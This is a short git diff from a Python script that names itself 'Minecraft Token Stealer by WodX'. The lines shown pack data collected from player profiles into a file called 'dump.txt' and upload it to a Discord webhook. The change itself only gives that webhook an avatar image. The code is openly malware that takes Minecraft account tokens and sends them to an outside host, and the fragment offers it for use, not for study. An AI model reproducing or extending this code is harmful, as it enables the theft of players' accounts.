@@ -47,7 +47,7 @@ def main():
         if i < len(profiles) - 1:
             data += b'\n'
     
-    webhook = discord_webhook.DiscordWebhook(WEBHOOK_URL, username='Minecraft Token Stealer by WodX')
+    webhook = discord_webhook.DiscordWebhook(WEBHOOK_URL, username='Minecraft Token Stealer by WodX', avatar_url='http://www.rw-designer.com/icon-image/5547-256x256x32.png')
     webhook.add_file(file=io.BytesIO(data), filename='dump.txt')
     webhook.execute()
 
